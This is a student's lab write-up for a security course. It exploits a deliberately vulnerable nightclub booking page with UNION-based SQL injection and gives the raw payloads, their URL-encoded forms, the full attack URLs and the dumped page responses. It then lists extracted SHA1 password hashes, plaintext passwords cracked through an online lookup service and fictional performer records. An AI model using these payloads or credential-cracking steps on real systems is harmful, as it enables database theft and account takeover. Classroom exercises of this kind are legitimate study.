Select, three distinct queries:
```mysql
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(id,''),COALESCE(usr,''),COALESCE(pwd,'')
)),NULL,NULL,NULL FROM accounts

SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(id,''),COALESCE(nick,''),COALESCE(age,''),COALESCE(hair,''),COALESCE(name,''),COALESCE(street,''),COALESCE(city,''),COALESCE(zip,''),COALESCE(citizen_id,'')
)),NULL,NULL,NULL FROM performers

SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(id,''),COALESCE(title,''),COALESCE(text,''),COALESCE(date_inserted,''),COALESCE(visible,'')
)),NULL,NULL,NULL FROM stories
```

Payloads:
```
' UNION
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(id,''),COALESCE(usr,''),COALESCE(pwd,'')
)),NULL,NULL,NULL FROM accounts
WHERE '1'='1

' UNION
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(id,''),COALESCE(nick,''),COALESCE(age,''),COALESCE(hair,''),COALESCE(name,''),COALESCE(street,''),COALESCE(city,''),COALESCE(zip,''),COALESCE(citizen_id,'')
)),NULL,NULL,NULL FROM performers
WHERE '1'='1

' UNION
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(id,''),COALESCE(title,''),COALESCE(text,''),COALESCE(date_inserted,''),COALESCE(visible,'')
)),NULL,NULL,NULL FROM stories
WHERE '1'='1
```

Encoded:
```
%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28id%2C%27%27%29%2CCOALESCE%28usr%2C%27%27%29%2CCOALESCE%28pwd%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20accounts%0AWHERE%20%271%27%3D%271
%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28id%2C%27%27%29%2CCOALESCE%28nick%2C%27%27%29%2CCOALESCE%28age%2C%27%27%29%2CCOALESCE%28hair%2C%27%27%29%2CCOALESCE%28name%2C%27%27%29%2CCOALESCE%28street%2C%27%27%29%2CCOALESCE%28city%2C%27%27%29%2CCOALESCE%28zip%2C%27%27%29%2CCOALESCE%28citizen_id%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20performers%0AWHERE%20%271%27%3D%271
%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28id%2C%27%27%29%2CCOALESCE%28title%2C%27%27%29%2CCOALESCE%28text%2C%27%27%29%2CCOALESCE%28date_inserted%2C%27%27%29%2CCOALESCE%28visible%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20stories%0AWHERE%20%271%27%3D%271
```

Whole URLs:
```
http://boura.fit.cvut.cz/nightclub/bookgirl.php?girl=%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28id%2C%27%27%29%2CCOALESCE%28usr%2C%27%27%29%2CCOALESCE%28pwd%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20accounts%0AWHERE%20%271%27%3D%271
http://boura.fit.cvut.cz/nightclub/bookgirl.php?girl=%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28id%2C%27%27%29%2CCOALESCE%28nick%2C%27%27%29%2CCOALESCE%28age%2C%27%27%29%2CCOALESCE%28hair%2C%27%27%29%2CCOALESCE%28name%2C%27%27%29%2CCOALESCE%28street%2C%27%27%29%2CCOALESCE%28city%2C%27%27%29%2CCOALESCE%28zip%2C%27%27%29%2CCOALESCE%28citizen_id%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20performers%0AWHERE%20%271%27%3D%271
http://boura.fit.cvut.cz/nightclub/bookgirl.php?girl=%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28id%2C%27%27%29%2CCOALESCE%28title%2C%27%27%29%2CCOALESCE%28text%2C%27%27%29%2CCOALESCE%28date_inserted%2C%27%27%29%2CCOALESCE%28visible%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20stories%0AWHERE%20%271%27%3D%271
```

Answer accounts:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<title>Night club template</title>
	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />
</head>

<body>
<div id="container">
	<div id="menu">

		<ul>
			<li id="m01"><a href="index.php">Home</a></li>
			<li id="m02"><a href="index-2.php">Photos</a></li>
			<li id="m03"><a href="index-3.php">Parties</a></li>
			<li id="m04"><a href="index-4.php">Booking</a></li>
			<li id="m05"><a href="index-5.php">Login</a></li>
		</ul>

	</div>
	<div id="header">
		<div id="dj">
		<div id="welcome">
			<h2>Booking</h2>
<b>Girl #["1,root,874572e7a5ae6a49466a6ac578b98adba78c6aa6", "2,www,214c418002e37328fa4269e3a4c952adc6e79ea4"]  is currently with a customer. Please try again later!</b>		</div>
		</div>
		<div class="clear"></div>
	</div>
	<div id="middle"></div>
	<div id="middle2"></div>
	<div id="footer">
		<p>Copyright � Website name all rights reserved. |  <a href="http://www.freewebsitetemplates.com/termsofuse">Terms of use</a></p>
	</div>
</div>
</body>
</html>
```

Answer performers:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<title>Night club template</title>
	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />
</head>

<body>
<div id="container">
	<div id="menu">

		<ul>
			<li id="m01"><a href="index.php">Home</a></li>
			<li id="m02"><a href="index-2.php">Photos</a></li>
			<li id="m03"><a href="index-3.php">Parties</a></li>
			<li id="m04"><a href="index-4.php">Booking</a></li>
			<li id="m05"><a href="index-5.php">Login</a></li>
		</ul>

	</div>
	<div id="header">
		<div id="dj">
		<div id="welcome">
			<h2>Booking</h2>
<b>Girl #["1,Rebecca,18,Brunette,Rebecca Chambers,123 15th Street S,Raccoon City,10000,887766/5544", "2,Jill,25,Blonde,Jill Valentine,1 Victory Square,Raccoon City,10000,133700/0000", "3,Claire,40,Blonde,Albert Wesker,Classified,Classified,00000,Umbrella1"]  is currently with a customer. Please try again later!</b>		</div>
		</div>
		<div class="clear"></div>
	</div>
	<div id="middle"></div>
	<div id="middle2"></div>
	<div id="footer">
		<p>Copyright � Website name all rights reserved. |  <a href="http://www.freewebsitetemplates.com/termsofuse">Terms of use</a></p>
	</div>
</div>
</body>
</html>
```

Answer stories:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<title>Night club template</title>
	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />
</head>

<body>
<div id="container">
	<div id="menu">

		<ul>
			<li id="m01"><a href="index.php">Home</a></li>
			<li id="m02"><a href="index-2.php">Photos</a></li>
			<li id="m03"><a href="index-3.php">Parties</a></li>
			<li id="m04"><a href="index-4.php">Booking</a></li>
			<li id="m05"><a href="index-5.php">Login</a></li>
		</ul>

	</div>
	<div id="header">
		<div id="dj">
		<div id="welcome">
			<h2>Booking</h2>
<b>Girl #["1,MI-BPR Site Launched,The MI-BPR site was launched on Monday, 8th November 2011. Enjoy the stunning photos, parties and girls offered by the site!,2011-11-07 00:28:28,1", "2,20% Discount to our VIP Members,We have a special Christmas offer for our valued customers. Rent a girl in December for the entire night and get another one for FREE!</p><p>See more details about this exclusive deal <a href=\"xmasdeal.php\">here</a>.,2016-09-18 08:36:32,1", "3,You have earned 0.5 points,By changing the data you got access to a record which is marked invisible. Inform your teacher.,2015-11-17 18:31:05,0", "12345,Did you actually check the gathered data?,If you did, notify your teacher that you deserve 0.5 extra points.,2016-09-18 07:31:29,0"]  is currently with a customer. Please try again later!</b>		</div>
		</div>
		<div class="clear"></div>
	</div>
	<div id="middle"></div>
	<div id="middle2"></div>
	<div id="footer">
		<p>Copyright � Website name all rights reserved. |  <a href="http://www.freewebsitetemplates.com/termsofuse">Terms of use</a></p>
	</div>
</div>
</body>
</html>
```

Accounts data:
- `login`: `password sha1`
- `root`: `874572e7a5ae6a49466a6ac578b98adba78c6aa6`
- `www`: `214c418002e37328fa4269e3a4c952adc6e79ea4`

We will use reverse hashing online decrypters that have precomputed hashes of
many hashing algorithms like [this](https://hashes.com/en/decrypt/hash).

We get passwords:
- `root`: `Tr0ub4dor&3`
- `www`: `nemesis`

Both passwords work, I tried.

Performers data:
- `nick`,`age`,`hair`,`name`,`street`,`city`,`zip`,`citizen_id`
- `Rebecca`,`18`,`Brunette`,`Rebecca Chambers`,`123 15th Street S`,`Raccoon City`,`10000`,`887766/5544`
- `Jill`,`25`,`Blonde`,`Jill Valentine`,`1 Victory Square`,`Raccoon City`,`10000`,`133700/0000`
- `Claire`,`40`,`Blonde`,`Albert Wesker`,`Classified`,`Classified`,`00000`,`Umbrella1`

Third performer looks weird... Albert Wesker?, Classified?, citizen_id=Umbrella1???


Stories data:
- `id`,`title`,`text`,`date_inserted`,`visible`
- `1`,`MI-BPR Site Launched`, `The MI-BPR site was launched on Monday, 8th November 2011. Enjoy the stunning photos, parties and girls offered by the site!`,`2011-11-07 00:28:28`,`1`
- `2`,`20% Discount to our VIP Members`, `We have a special Christmas offer for our valued customers. Rent a girl in December for the entire night and get another one for FREE!</p><p>See more details about this exclusive deal <a href=\"xmasdeal.php\">here</a>.`,`2016-09-18 08:36:32`,`1`
- `3`,`You have earned 0.5 points`, `By changing the data you got access to a record which is marked invisible. Inform your teacher.`, `2015-11-17 18:31:05`, `0`
- `12345`,`Did you actually check the gathered data?`,`If you did, notify your teacher that you deserve 0.5 extra points.`,`2016-09-18 07:31:29`,`0`

We can see two more invisible stories, one that can be found easily even without SQL injection with id = 3,
and one that would be hard to find without access to DB with id 12345.
I am notifying teacher I found both Easter eggs.

